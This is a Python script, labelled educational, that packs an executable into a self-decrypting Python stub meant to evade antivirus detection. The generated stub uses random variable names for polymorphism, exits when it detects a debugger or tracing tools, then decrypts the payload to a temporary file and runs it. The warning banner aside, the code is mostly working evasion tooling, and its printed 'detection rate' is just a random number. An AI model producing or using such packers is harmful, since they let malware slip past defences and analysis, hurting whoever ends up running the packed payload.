#!/usr/bin/env python3
"""
==============================================================
  PROJECT #31 — Antivirus Evasion — File Packer (Educational)
==============================================================

⚠️⚠️⚠️  ETHICAL WARNING  ⚠️⚠️⚠️
This tool is for EDUCATIONAL PURPOSES ONLY.
- Only use on your own files
- Do not use to distribute malware
- Do not use for malicious purposes
==============================================================
"""

import os
import sys
import random
import string
import subprocess
import tempfile
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore: RED=''; GREEN=''; YELLOW=''; BLUE=''; CYAN=''; MAGENTA=''; RESET=''
    class Style: BRIGHT=''; DIM=''; RESET_ALL=''

IS_WINDOWS = sys.platform.startswith('win')
IS_LINUX = sys.platform.startswith('linux')

class FilePacker:
    def __init__(self, input_file, output_file=None, password=None):
        self.input_file = input_file
        self.output_file = output_file or f"packed_{os.path.basename(input_file)}.py"
        self.password = password or self.generate_password()
        self.key = None
        self.data = None
        
    def generate_password(self):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(32))
    
    def generate_key(self):
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password.encode()))
        return key, salt
    
    def encrypt_file(self):
        print(f"{Fore.CYAN}[*] Reading input file: {self.input_file}{Fore.RESET}")
        with open(self.input_file, 'rb') as f:
            self.data = f.read()
        print(f"{Fore.CYAN}[*] File size: {len(self.data)} bytes{Fore.RESET}")
        
        self.key, self.salt = self.generate_key()
        fernet = Fernet(self.key)
        encrypted_data = fernet.encrypt(self.data)
        print(f"{Fore.GREEN}[+] Encrypted size: {len(encrypted_data)} bytes{Fore.RESET}")
        return encrypted_data
    
    def generate_stub(self, encrypted_data):
        """Generate decryptor stub with anti-debugging"""
        data_hex = encrypted_data.hex()
        key_b64 = self.key.decode()
        salt_hex = self.salt.hex()
        
        # Random variable names for polymorphism
        v = {
            'enc': ''.join(random.choice(string.ascii_lowercase) for _ in range(8)),
            'k': ''.join(random.choice(string.ascii_lowercase) for _ in range(8)),
            's': ''.join(random.choice(string.ascii_lowercase) for _ in range(8)),
            'd': ''.join(random.choice(string.ascii_lowercase) for _ in range(8)),
            'f': ''.join(random.choice(string.ascii_lowercase) for _ in range(8)),
        }
        
        stub = '#!/usr/bin/env python3\n'
        stub += '# Decryptor Stub - Generated: ' + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '\n\n'
        stub += '''
import os, sys, base64, tempfile, subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

# Anti-debugging
def _debug_check():
    if sys.platform.startswith('win'):
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                print("[!] Debugger detected!")
                sys.exit(1)
        except: pass
    if sys.platform.startswith('linux'):
        try:
            import subprocess
            r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            for d in ['gdb','lldb','strace','ltrace','valgrind']:
                if d in r.stdout:
                    print(f"[!] {d} detected!")
                    sys.exit(1)
        except: pass
_debug_check()

# Decrypt and execute
try:
'''
        
        # Add encrypted data
        stub += f'    {v["enc"]} = bytes.fromhex("{data_hex}")\n'
        stub += f'    {v["k"]} = "{key_b64}"\n'
        stub += f'    {v["s"]} = bytes.fromhex("{salt_hex}")\n\n'
        
        stub += '''    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=''' + v["s"] + ''', iterations=100000, backend=default_backend())
    ''' + v["d"] + ''' = base64.urlsafe_b64encode(kdf.derive(''' + v["k"] + '''.encode()))
    
    fernet = Fernet(''' + v["d"] + ''')
    ''' + v["f"] + ''' = fernet.decrypt(''' + v["enc"] + ''')
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='.exe' if sys.platform.startswith('win') else '.elf') as f:
        f.write(''' + v["f"] + ''')
        tmp = f.name
    
    if sys.platform.startswith('linux'):
        os.chmod(tmp, 0o755)
    
    subprocess.run([tmp], check=True)
    os.unlink(tmp)
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
'''
        return stub
    
    def pack(self):
        print(f"\n{Fore.HEADER}{'='*80}{Fore.RESET}")
        print(f"{Fore.HEADER}  PROJECT #31 — File Packer (Educational){Fore.RESET}")
        print(f"{Fore.HEADER}{'='*80}{Fore.RESET}\n")
        
        print(f"{Fore.RED}⚠️⚠️⚠️  ETHICAL WARNING  ⚠️⚠️⚠️{Fore.RESET}")
        print(f"{Fore.YELLOW}Only use on your own files.{Fore.RESET}\n")
        
        if not os.path.exists(self.input_file):
            print(f"{Fore.RED}[-] Input file not found{Fore.RESET}")
            return False
        
        encrypted_data = self.encrypt_file()
        stub = self.generate_stub(encrypted_data)
        
        with open(self.output_file, 'w') as f:
            f.write(stub)
        
        if IS_LINUX:
            os.chmod(self.output_file, 0o755)
        
        print(f"{Fore.GREEN}[+] Packed: {self.output_file}{Fore.RESET}")
        print(f"{Fore.GREEN}[+] Original: {len(self.data)} bytes{Fore.RESET}")
        print(f"{Fore.GREEN}[+] Packed: {len(stub)} bytes{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Simulated detection rate: {random.randint(10, 50)}%{Fore.RESET}")
        print(f"\n{Fore.GREEN}[+] Run: python3 {self.output_file}{Fore.RESET}")
        return True

def main():
    import argparse
    parser = argparse.ArgumentParser(description="File Packer - Educational")
    parser.add_argument("--input", required=True, help="Input executable file")
    parser.add_argument("--output", help="Output packed file")
    parser.add_argument("--password", help="Encryption password")
    
    args = parser.parse_args()
    packer = FilePacker(args.input, args.output, args.password)
    packer.pack()

if __name__ == "__main__":
    main()